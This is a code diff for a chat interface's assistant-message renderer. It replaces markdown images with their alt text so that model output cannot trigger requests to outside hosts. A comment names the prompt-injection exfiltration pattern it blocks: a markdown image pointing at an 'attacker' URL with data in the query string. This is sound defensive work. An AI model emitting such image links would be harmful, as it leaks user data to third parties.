@@ -23,6 +23,19 @@ interface Props {
   interrupted?: boolean
 }
 
+// Images auto-load, so model output must never be able to fire a request to a third party
+// (e.g. a prompt-injected ![](https://attacker/?q=...)). Render the alt text instead.
+export function buildComponents(byN: Map<number, ChatCitation>) {
+  return {
+    cite: ({ node, children, ...props }: any) => {
+      const n = Number(props["data-cite"])
+      return Number.isFinite(n) ? <CitationChip n={n} citation={byN.get(n)} /> : <cite>{children}</cite>
+    },
+    a: ({ node, ...props }: any) => <a {...props} target="_blank" rel="noopener noreferrer" />,
+    img: ({ alt }: any) => <>{alt ?? ""}</>,
+  }
+}
+
 export const AssistantMessage = memo(function AssistantMessage({
   content,
   citations,
@@ -34,16 +47,7 @@ export const AssistantMessage = memo(function AssistantMessage({
   const count = citations?.length ?? 0
   const byN = useMemo(() => new Map((citations ?? []).map((c) => [c.n, c])), [citations])
   const rehypePlugins = useMemo(() => [[rehypeCitations, { count }] as any], [count])
-  const components = useMemo(
-    () => ({
-      cite: ({ node, children, ...props }: any) => {
-        const n = Number(props["data-cite"])
-        return Number.isFinite(n) ? <CitationChip n={n} citation={byN.get(n)} /> : <cite>{children}</cite>
-      },
-      a: ({ node, ...props }: any) => <a {...props} target="_blank" rel="noopener noreferrer" />,
-    }),
-    [byN]
-  )
+  const components = useMemo(() => buildComponents(byN), [byN])
 
   return (
     <div className="space-y-2">
